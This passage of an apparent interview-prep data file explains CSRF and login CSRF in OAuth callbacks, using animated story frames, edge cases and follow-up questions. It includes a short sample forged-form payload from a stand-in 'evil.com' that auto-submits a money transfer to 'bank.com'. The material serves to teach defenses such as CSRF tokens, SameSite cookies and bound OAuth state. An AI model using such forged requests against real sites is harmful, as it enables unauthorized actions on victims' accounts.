    mentalModel:
      'The browser chooses which cookies to attach by looking at the request destination, not at the page that initiated it. So evil.com can make the victim browser send an authenticated request to bank.com while never reading the cookie or the response. Defenses either stop the browser from attaching credentials (SameSite) or make the server verify intent independently of ambient cookies (CSRF tokens, Origin checks) — and state-changing GET endpoints break both stories.',
    steps: [
      {
        title: 'Cookies travel by destination',
        body: `Cookies are not attached by the page that initiates a request; they are attached by the browser according to the request destination origin. That single fact is the foundation of CSRF. When the victim is logged into bank.com, the session cookie lives in the browser cookie store. Any page, including evil.com, can cause the browser to submit a form, load an image, or fire a no-cors fetch whose destination is bank.com, and the browser will attach the bank cookie because the destination matches. The attacker never sees that cookie and does not need to. The animation follows the request: the evil site triggers a transfer POST, the browser reaches into the cookie store, attaches the session cookie, and the bank server processes the request as the logged-in user. The response is unreadable cross-origin, but the money already moved.`,
        animation: {
          kind: 'story',
          cast: [
            { id: 'you', icon: '👤', label: 'You' },
            { id: 'coat', icon: '🧥', label: 'Browser coat' },
            { id: 'evil', icon: '😈', label: 'Evil site' },
            { id: 'bank', icon: '🏦', label: 'Bank' },
          ],
          frames: [
            { id: 'f1', caption: 'You log into the bank — your coat gets the bank’s stamp. 🧥', shout: { text: 'YOU GET THE STAMP', tone: 'info' }, cast: [{ id: 'bank', state: 'working' }], tokens: [{ id: 'stamp', icon: '🪪', label: 'session', from: 'bank', to: 'coat' }] },
            { id: 'f2', caption: 'The stamp follows the coat — not who asked for it. 🧥', shout: { text: 'STAMP FOLLOWS THE COAT', tone: 'info' }, cast: [{ id: 'coat', state: 'working' }], tokens: [{ id: 'follow', icon: '👀', label: 'by destination', at: 'coat', effect: 'pop' }] },
            { id: 'f3', caption: 'Evil site whispers: “Say these words to the bank!” 😈', shout: { text: 'EVIL SAYS: GO!', tone: 'bad' }, mood: 'bad', cast: [{ id: 'evil', state: 'working' }], tokens: [{ id: 'whisper', icon: '📨', label: '“send money!”', from: 'evil', to: 'you' }] },
            { id: 'f4', caption: 'Your coat shows the stamp automatically — no questions. 😱', shout: { text: 'STAMP SHOWN!', tone: 'bad' }, mood: 'bad', cast: [{ id: 'coat', state: 'crashed' }], tokens: [{ id: 'reveal', icon: '🪪', label: 'looks real', from: 'coat', to: 'bank' }] },
            { id: 'f5', caption: 'The bank obeys — the words came stamped. 💸', shout: { text: 'BANK OBEYS', tone: 'bad' }, mood: 'bad', cast: [{ id: 'bank', state: 'done' }], tokens: [{ id: 'money', icon: '💸', label: 'sent!', at: 'bank', effect: 'pop' }] },
          ],
        },
      },
      {
        title: 'Riding, not stealing',
        body: `Candidates often assume CSRF requires stealing a session token, so they answer with HTTPS or token storage and miss the point. CSRF never reads the cookie: the attacker page only causes the browser to send it, and the side effect on the server is the payload. That is why the same-origin policy does not save you — it blocks reading responses, not sending requests. The animation shows this explicitly: on the forged request the cookie store hands the session cookie to the browser, which forwards it to the bank, while the evil site learns nothing back. Mechanisms that trigger a credentialed cross-site request include auto-submitted forms, image and link tags, and fetch with mode no-cors. Because the response body is irrelevant, blocking script access changes nothing. The defense must live either in the browser cookie policy or in server-side request validation.`,
        code: {
          language: 'html',
          source: `<!-- evil.com: no script needed, no cookie access needed -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="5000" />
</form>
<script>document.getElementById('f').submit();</script>`,
        },
        animation: {
          kind: 'story',
          cast: [
            { id: 'you', icon: '👤', label: 'You' },
            { id: 'evil', icon: '😈', label: 'Evil site' },
            { id: 'coat', icon: '🧥', label: 'Browser coat' },
            { id: 'bank', icon: '🏦', label: 'Bank' },
          ],
          frames: [
            { id: 'f1', caption: 'The evil site never touches your stamp. 😈', shout: { text: 'NO STEALING NEEDED', tone: 'info' }, cast: [{ id: 'evil', state: 'working' }], tokens: [{ id: 'nope', icon: '🚫', label: 'no reading', at: 'evil', effect: 'pop' }] },
            { id: 'f2', caption: 'It only needs the bank to HEAR the words. 📨', shout: { text: 'ONLY A SEND', tone: 'info' }, cast: [{ id: 'you', state: 'working' }], tokens: [{ id: 'say', icon: '📨', label: 'whispered words', from: 'evil', to: 'you' }] },
            { id: 'f3', caption: 'A hidden form does the talking — no clicks needed. 📝', shout: { text: 'HIDDEN FORM', tone: 'bad' }, mood: 'bad', cast: [{ id: 'coat', state: 'working' }], tokens: [{ id: 'form', icon: '📝', label: 'auto-submit', from: 'evil', to: 'coat' }] },
            { id: 'f4', caption: 'Your coat stamps it on the way to the bank. 😬', shout: { text: 'STAMPED ON THE WAY', tone: 'bad' }, mood: 'bad', cast: [{ id: 'bank', state: 'done' }], tokens: [{ id: 'stamped', icon: '🪪', label: 'session', from: 'coat', to: 'bank' }] },
            { id: 'f5', caption: 'You never see the answer — and it does not matter. 🙈', shout: { text: 'ANSWER NOT NEEDED', tone: 'bad' }, mood: 'bad', cast: [{ id: 'you', state: 'idle', face: '🙈' }], tokens: [{ id: 'blind', icon: '🙈', label: 'too late', at: 'you', effect: 'pop' }] },
          ],
        },
      },
      {
        title: 'CSRF tokens prove intent',
        body: `If the browser attaches cookies automatically, the server needs a second signal that the request came from the application's own page and not from a forged one. The standard answer is a CSRF token: a random, per-session value embedded in forms or sent as a custom header, which the server compares on every state-changing request. The attacker cannot read the token because the same-origin policy prevents cross-origin reads, and cannot guess it because it is unpredictable. The animation shows both paths: the legitimate submit carries the cookie plus a matching token and is accepted; the forged submit carries the cookie but no valid token and is rejected. Implementation details matter — bind the token to the session, compare in constant time, and rotate it on login. A double-submit cookie is an acceptable stateless variant when SameSite is also enforced.`,
        animation: {
          kind: 'story',
          cast: [
            { id: 'bank', icon: '🏦', label: 'Bank' },
            { id: 'you', icon: '👤', label: 'You' },
            { id: 'evil', icon: '😈', label: 'Evil site' },
          ],
          frames: [
            { id: 'f1', caption: 'The bank gives real visitors a secret word per visit. 🎫', shout: { text: 'SECRET WORD', tone: 'info' }, cast: [{ id: 'bank', state: 'working' }], tokens: [{ id: 'word', icon: '🎫', label: 'csrf token', from: 'bank', to: 'you' }] },
            { id: 'f2', caption: 'The word only travels inside the bank’s own pages. 📄', shout: { text: 'PAGES ONLY', tone: 'info' }, cast: [{ id: 'you', state: 'working' }], tokens: [{ id: 'inside', icon: '📄', label: 'hidden in form', at: 'you', effect: 'pop' }] },
            { id: 'f3', caption: 'Genuine submit: stamp + word match. ✅', shout: { text: 'MATCH: ALLOWED ✓', tone: 'good' }, mood: 'good', cast: [{ id: 'bank', state: 'done' }], tokens: [{ id: 'ok', icon: '✅', label: 'welcome in', from: 'you', to: 'bank' }] },
            { id: 'f4', caption: 'Forged submit: the stamp is there, but no word! 🚫', shout: { text: 'NO WORD: DENIED!', tone: 'bad' }, mood: 'bad', cast: [{ id: 'evil', state: 'crashed' }], tokens: [{ id: 'denied', icon: '🚫', label: 'cannot guess it', at: 'bank', effect: 'shake' }] },
            { id: 'f5', caption: 'Stamp = session. Word = intent. You need both. 📋', shout: { text: 'BOTH OR NOTHING ✓', tone: 'good' }, mood: 'good', cast: [{ id: 'bank', state: 'happy' }], tokens: [{ id: 'rule', icon: '📋', label: 'check intent', at: 'bank', effect: 'pop' }] },
          ],
        },
      },
      {
        title: 'SameSite: the browser default',
        body: `SameSite gives the browser a veto before the cookie is ever attached. SameSite=Strict never sends the cookie on cross-site requests; SameSite=Lax allows it only on top-level GET navigations and withholds it from cross-site POSTs, iframes, and scripted requests; SameSite=None requires Secure and sends everywhere, which is the setting to audit carefully. Modern browsers default unset cookies to Lax, which quietly removed a large share of the CSRF surface. The animation sends the same forged POST twice: first the Lax cookie is withheld by the browser, then the request arrives at the bank with no session and fails closed. The caveat is the GET exception — a top-level link still carries a Lax cookie, so any GET endpoint that changes state remains exploitable. Never change state on GET.`,
        animation: {
          kind: 'story',
          cast: [
            { id: 'coat', icon: '🧥', label: 'Browser coat' },
            { id: 'evil', icon: '😈', label: 'Evil site' },
            { id: 'bank', icon: '🏦', label: 'Bank' },
          ],
          frames: [
            { id: 'f1', caption: 'New coat rule: “show the stamp only when going home.” 🏷️', shout: { text: 'HOME-ONLY BADGE', tone: 'good' }, mood: 'good', cast: [{ id: 'coat', state: 'locked' }], tokens: [{ id: 'badge', icon: '🏷️', label: 'SameSite=Lax', at: 'coat', effect: 'pop' }] },
            { id: 'f2', caption: 'A stranger’s request arrives — the coat hides the stamp. 🙈', shout: { text: 'STAMP HIDDEN ✓', tone: 'good' }, mood: 'good', cast: [{ id: 'evil', state: 'crashed' }], tokens: [{ id: 'hide', icon: '🙈', label: 'not for you', at: 'coat', effect: 'pop' }] },
            { id: 'f3', caption: 'The request walks to the bank completely naked. 🚶', shout: { text: 'NAKED REQUEST', tone: 'info' }, cast: [{ id: 'bank', state: 'working' }], tokens: [{ id: 'naked', icon: '🚶', label: 'no stamp', from: 'evil', to: 'bank' }] },
            { id: 'f4', caption: 'Bank asks: “Who are you?” — door closed. 🚫', shout: { text: 'DENIED ✓', tone: 'good' }, mood: 'good', cast: [{ id: 'bank', state: 'done' }], tokens: [{ id: 'closed', icon: '🚫', label: 'anonymous', at: 'bank', effect: 'pop' }] },
            { id: 'f5', caption: 'But a plain link still shows the stamp — never change things on a simple link! ⚠️', shout: { text: 'CAREFUL: GET LINKS', tone: 'info' }, cast: [{ id: 'coat', state: 'working' }], tokens: [{ id: 'warn', icon: '⚠️', label: 'GET carries it', at: 'coat', effect: 'shake' }] },
          ],
        },
      },
      {
        title: 'POST-only is not enough',
        body: `Some engineers conclude that accepting only POST blocks CSRF because an attacker cannot forge a POST. They can: a hidden HTML form with method post, submitted automatically by script or by an onload handler, sends a simple cross-site request with no preflight, and cookies ride along. The misconception comes from confusing POST with non-simple CORS requests. Requiring Content-Type application/json or a custom header raises the bar because those trigger a preflight that a cross-site form cannot satisfy, but that is a side effect of CORS rather than of the method itself. Meanwhile GET endpoints with side effects are the worst case: links, images, and prefetchers all trigger them. The animation shows a form-based cross-site POST succeeding while a JSON request is stopped by preflight. Keep state changes on POST and still require tokens or SameSite.`,
        code: {
          language: 'javascript',
          source: `// a simple form POST needs no preflight — CSRF works
form.method = 'POST';
form.action = 'https://bank.com/transfer';

// a JSON fetch is non-simple: the browser preflights it,
// and without CORS approval the request never reaches the bank
fetch('https://bank.com/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' },
});`,
        },
        animation: {
          kind: 'story',
          cast: [
            { id: 'guard', icon: '💂', label: 'Gate guard' },
            { id: 'form', icon: '📝', label: 'Hidden form' },
            { id: 'bank', icon: '🏦', label: 'Bank' },
          ],
          frames: [
            { id: 'f1', caption: 'A memo says: “We only accept POST!” — feels safe. 📮', shout: { text: 'ONLY POST!', tone: 'info' }, cast: [{ id: 'guard', state: 'working' }], tokens: [{ id: 'memo', icon: '📮', label: 'the rule', at: 'guard', effect: 'pop' }] },
            { id: 'f2', caption: 'But hidden forms can POST too — no permission needed. 📝', shout: { text: 'FORMS CAN POST', tone: 'bad' }, mood: 'bad', cast: [{ id: 'form', state: 'working' }], tokens: [{ id: 'trick', icon: '📝', label: 'forged POST', from: 'form', to: 'guard' }] },
            { id: 'f3', caption: 'The forged letter sails right through the gate. 🚢', shout: { text: 'SAILED THROUGH', tone: 'bad' }, mood: 'bad', cast: [{ id: 'bank', state: 'done' }], tokens: [{ id: 'boat', icon: '🚢', label: 'delivered', from: 'guard', to: 'bank' }] },
            { id: 'f4', caption: 'Only the special JSON gate stops forms — and only by accident. 🚧', shout: { text: 'NOT THE METHOD', tone: 'info' }, cast: [{ id: 'guard', state: 'working' }], tokens: [{ id: 'barrier', icon: '🚧', label: 'preflight', at: 'guard', effect: 'pop' }] },
            { id: 'f5', caption: 'The method was never the guard: bring the word and the badge. 🛡️', shout: { text: 'REAL GUARDS ONLY ✓', tone: 'good' }, mood: 'good', cast: [{ id: 'bank', state: 'locked' }], tokens: [{ id: 'shield', icon: '🛡️', label: 'token + SameSite', at: 'bank', effect: 'pop' }] },
          ],
        },
      },
    ],
    edgeCases: [
      'Assuming POST-only is safe: HTML forms POST cross-site as simple requests without preflight — require a CSRF token or SameSite instead of trusting the method.',
      'Forgetting GET side effects: links, images, and prefetchers trigger top-level or subresource GETs that still carry Lax cookies — never change state on GET.',
      'Using SameSite=None without Secure: browsers reject insecure None cookies, and None sends them on every cross-site request — pair None with Secure and a CSRF token.',
      'Trusting the Origin header when it is absent: some clients omit it — fall back to Referer, validate against an allowlist, and fail closed for state-changing requests.',
      'Storing SPA tokens in localStorage to dodge CSRF: the vulnerability disappears but XSS theft takes over — pick the threat you can mitigate and layer defenses.',
    ],
    followUps: [
      {
        q: 'Why does the same-origin policy not stop CSRF?',
        a: 'The same-origin policy prevents one origin from reading another response; it does not prevent the browser from sending a request with cookies attached. CSRF only needs the send, not the read.',
      },
      {
        q: 'What does SameSite=Lax actually allow?',
        a: 'It withholds cookies from cross-site POSTs, iframes, and scripted requests, but sends them on top-level GET navigations. That exception is why GET endpoints must never have side effects.',
      },
      {
        q: 'Do CSRF tokens replace SameSite?',
        a: 'No, they complement each other. SameSite is browser-enforced but can be bypassed by older clients or subdomain deployments, while a verified token proves the request came from your page. Use both.',
      },
    ],
    relatedEngine: { label: 'Explore the Web Security visualizer', href: '/fullstack/websecurity' },
  },
  {
    slug: 'login-csrf-oauth-state',
    category: 'cybersecurity',
    topic: 'Web Security',
    title: 'How does login CSRF work in an OAuth callback?',
    difficulty: 'advanced',
    frequency: 'sometimes',
    round: 'concept',
    type: 'concept',
    tags: ['login-csrf', 'oauth-state', 'session-fixation', 'callback-binding', 'csrf', 'oauth2'],
    oneLiner:
      'A signed session ID proves the server made the login URL, not that the browser finishing the login is the one that asked for it.',
    whyAsked:
      'Interviewers use this to separate "I add CSRF tokens" from "I understand binding". Classic CSRF abuses a cookie the browser attaches; login CSRF abuses a session identifier the attacker already knows. Strong answers explain why a signed callback URL, PKCE, and SameSite each miss the problem, then name the fix: a browser-bound, single-use state value and session rotation.',
    mentalModel:
      'Think of a coat-check ticket. The attacker asks the clerk for ticket #123 for their own hook, then hands the ticket to the victim. The victim gives the clerk their coat; the clerk hangs it on hook #123 — the attacker’s hook. The ticket was genuine. The clerk never checked who owned the hook.',
    steps: [
      {
        title: 'A signed link is a claim ticket',
        body: `The attacker starts a login in their own session. The server returns /authorize?session_id=ATTACKER with an HMAC over the session ID and timestamp. The signature proves the server generated the link. It does not prove who will open it. The attacker now holds a valid claim ticket for their own hook.`,
        animation: {
          kind: 'story',
          cast: [
            { id: 'attacker', icon: '😈', label: 'Attacker' },
            { id: 'app', icon: '🧠', label: 'App / MCP server' },
          ],
          frames: [
            { id: 'f1', caption: 'The attacker asks for a login link. 😈', shout: { text: 'START LOGIN', tone: 'info' }, cast: [{ id: 'attacker', state: 'working' }], tokens: [{ id: 'ask', icon: '📨', label: 'login?', from: 'attacker', to: 'app' }] },
            { id: 'f2', caption: 'The server signs the attacker’s session ID. 🔏', shout: { text: 'SIGNED FOR ATTACKER', tone: 'bad' }, mood: 'bad', cast: [{ id: 'app', state: 'working' }], tokens: [{ id: 'sign', icon: '🔏', label: 'session_id = ATTACKER', at: 'app', effect: 'pop' }] },
            { id: 'f3', caption: 'The attacker now owns a valid claim ticket. 🎫', shout: { text: 'TICKET #ATTACKER', tone: 'bad' }, mood: 'bad', cast: [{ id: 'attacker', state: 'happy' }], tokens: [{ id: 'ticket', icon: '🎫', label: 'real signed link', from: 'app', to: 'attacker' }] },
          ],
        },
      },
      {
        title: 'The ticket travels to the victim',
        body: `The link points at the real service, so it looks trustworthy. The attacker sends it to the victim. The victim sees a legitimate domain, clicks, and starts a normal login. Nothing in the URL says the session belongs to the attacker.`,
        animation: {
          kind: 'story',
          cast: [
            { id: 'attacker', icon: '😈', label: 'Attacker' },
            { id: 'victim', icon: '👤', label: 'Victim' },
          ],
          frames: [
            { id: 'f1', caption: 'The attacker forwards the real link. 📨', shout: { text: 'FORWARD THE TICKET', tone: 'bad' }, mood: 'bad', cast: [{ id: 'attacker', state: 'working' }], tokens: [{ id: 'send', icon: '🔗', label: 'real login link', from: 'attacker', to: 'victim' }] },
            { id: 'f2', caption: 'The victim checks the domain — it looks real. 🔍', shout: { text: 'LOOKS LEGITIMATE', tone: 'info' }, cast: [{ id: 'victim', state: 'working' }], tokens: [{ id: 'check', icon: '🔍', label: 'trusted domain', at: 'victim', effect: 'pop' }] },
            { id: 'f3', caption: 'The victim clicks and starts a normal login. 😬', shout: { text: 'CLICKS THE LINK', tone: 'bad' }, mood: 'bad', cast: [{ id: 'victim', state: 'working' }], tokens: [{ id: 'open', icon: '🖱️', label: 'opens /authorize', at: 'victim', effect: 'pop' }] },
          ],
        },
      },
      {
        title: 'The victim completes the login',
        body: `The victim authenticates with the identity provider. The provider redirects to /callback with a one-time request_token and the session_id that was forwarded as redirect_params. The app exchanges the request token and receives the victim’s access token.`,
        animation: {
          kind: 'story',
          cast: [
            { id: 'victim', icon: '👤', label: 'Victim' },
            { id: 'idp', icon: '🏦', label: 'Identity provider' },
            { id: 'app', icon: '🧠', label: 'App / MCP server' },
          ],
          frames: [
            { id: 'f1', caption: 'The victim logs in with real credentials and MFA. 🔐', shout: { text: 'REAL LOGIN', tone: 'info' }, cast: [{ id: 'victim', state: 'working' }, { id: 'idp', state: 'working' }], tokens: [{ id: 'creds', icon: '🔐', label: 'credentials + MFA', from: 'victim', to: 'idp' }] },
            { id: 'f2', caption: 'The provider returns a code and the forwarded session_id. 📄', shout: { text: 'CODE + SESSION_ID', tone: 'bad' }, mood: 'bad', cast: [{ id: 'app', state: 'working' }], tokens: [{ id: 'code', icon: '📄', label: 'request_token + redirect_params', from: 'idp', to: 'app' }] },
            { id: 'f3', caption: 'The app exchanges the code for the victim’s token. 🔑', shout: { text: 'VICTIM TOKEN ISSUED', tone: 'bad' }, mood: 'bad', cast: [{ id: 'app', state: 'done' }], tokens: [{ id: 'token', icon: '🔑', label: 'victim access token', at: 'app', effect: 'pop' }] },
          ],
        },
      },
      {
        title: 'The token lands on the attacker’s hook',
        body: `The callback verifies the HMAC, then attaches the victim’s access token to the session named in the URL. That session is the attacker’s. The server never checks that the browser finishing the login is the browser that started it. The attacker can now call every tool the app exposes.`,
        animation: {
          kind: 'story',
          cast: [
            { id: 'app', icon: '🧠', label: 'App / MCP server' },
            { id: 'attacker', icon: '😈', label: 'Attacker' },
            { id: 'victim', icon: '👤', label: 'Victim' },
          ],
          frames: [
            { id: 'f1', caption: 'The callback looks up the session named in the URL. 🔎', shout: { text: 'SESSION = ATTACKER', tone: 'bad' }, mood: 'bad', cast: [{ id: 'app', state: 'working' }], tokens: [{ id: 'lookup', icon: '🔎', label: 'session_id = ATTACKER', at: 'app', effect: 'pop' }] },
            { id: 'f2', caption: 'The victim’s token is attached to the attacker’s session. 🔗', shout: { text: 'WRONG HOOK!', tone: 'bad' }, mood: 'bad', cast: [{ id: 'app', state: 'done' }, { id: 'victim', state: 'idle' }], tokens: [{ id: 'attach', icon: '🔗', label: 'victim token → ATTACKER', at: 'app', effect: 'burst' }] },
            { id: 'f3', caption: 'The attacker reuses the session to read and trade. 💸', shout: { text: 'ATTACKER ACTS', tone: 'bad' }, mood: 'bad', cast: [{ id: 'attacker', state: 'happy' }], tokens: [{ id: 'act', icon: '💸', label: 'profile + holdings + order', from: 'attacker', to: 'app' }] },
          ],
        },
      },
      {
        title: 'Fix: bind state to the browser',
        body: `On /authorize, generate a random state, set it in a short-lived HttpOnly, Secure, SameSite=Lax cookie, and send the same value to the provider. On /callback, compare the returned state with the cookie before exchanging the code; reject on mismatch, make it single-use, and rotate the session ID after login. PKCE protects the code exchange, not the browser-to-session binding.`,
        code: {
          language: 'javascript',
          source: `// /authorize
res.cookie('oauth_state', state, {
  httpOnly: true, secure: true, sameSite: 'lax', maxAge: 300000,
});
res.redirect('https://idp.example/authorize?...&state=' + encodeURIComponent(state));

// /callback
if (req.query.state !== req.cookies.oauth_state) {
  return res.status(403).end();
}`,
        },
        animation: {
          kind: 'story',
          cast: [
            { id: 'victim', icon: '👤', label: 'Victim' },
            { id: 'app', icon: '🧠', label: 'App / MCP server' },
            { id: 'attacker', icon: '😈', label: 'Attacker' },
          ],
          frames: [
            { id: 'f1', caption: 'The app stores a random state in the victim’s browser. 🍪', shout: { text: 'SET STATE COOKIE', tone: 'good' }, mood: 'good', cast: [{ id: 'app', state: 'working' }], tokens: [{ id: 'cookie', icon: '🍪', label: 'HttpOnly state', from: 'app', to: 'victim' }] },
            { id: 'f2', caption: 'The victim returns with the same state. 📨', shout: { text: 'STATE RETURNS', tone: 'info' }, cast: [{ id: 'victim', state: 'working' }], tokens: [{ id: 'return', icon: '📨', label: 'state', from: 'victim', to: 'app' }] },
            { id: 'f3', caption: 'The cookie and the returned state match. ✅', shout: { text: 'MATCH: ALLOWED ✓', tone: 'good' }, mood: 'good', cast: [{ id: 'app', state: 'done' }], tokens: [{ id: 'match', icon: '✅', label: 'binding verified', at: 'app', effect: 'pop' }] },
            { id: 'f4', caption: 'The attacker’s stale link fails the state check. 🚫', shout: { text: 'MISMATCH: DENIED!', tone: 'bad' }, mood: 'good', cast: [{ id: 'attacker', state: 'crashed' }], tokens: [{ id: 'deny', icon: '🚫', label: 'no victim token', at: 'attacker', effect: 'shake' }] },
          ],
        },
      },
    ],
    edgeCases: [
      'A signed session_id is not a CSRF token: the attacker can legitimately obtain a signed URL for their own session. The signature proves integrity, not intent.',
      'PKCE does not stop login CSRF: it protects the authorization code exchange, but the attacker can still start the flow and hand the authorize URL to a victim.',
      'State stored only in server memory can still be fixed if the attacker initiates the flow; bind it to a browser cookie and make it single-use.',
      'Magic links are bearer tokens too: a forwarded sign-in link logs the recipient into the sender’s account. Bind or confirm intent where the impact matters.',
    ],
    followUps: [
      {
        q: 'Why doesn’t PKCE prevent login CSRF?',
        a: 'PKCE proves the client that started the code exchange is the one finishing it. It does not prove the browser finishing the login is the one that initiated it; the attacker can start the flow and send the authorize URL to a victim.',
      },
      {
        q: 'Where should the OAuth state live?',
        a: 'A short-lived HttpOnly, Secure, SameSite=Lax cookie, compared constant-time with the returned state. Make it single-use and rotate the session ID after login.',
      },
      {
        q: 'Is a signed callback URL ever enough?',
        a: 'No. A signature proves the server created the URL; it does not bind the callback to the browser. Treat the signed session ID as a routing hint, not as proof of user intent.',
      },
    ],
    relatedEngine: { label: 'Explore the Web Security visualizer', href: '/fullstack/websecurity' },
  },
];
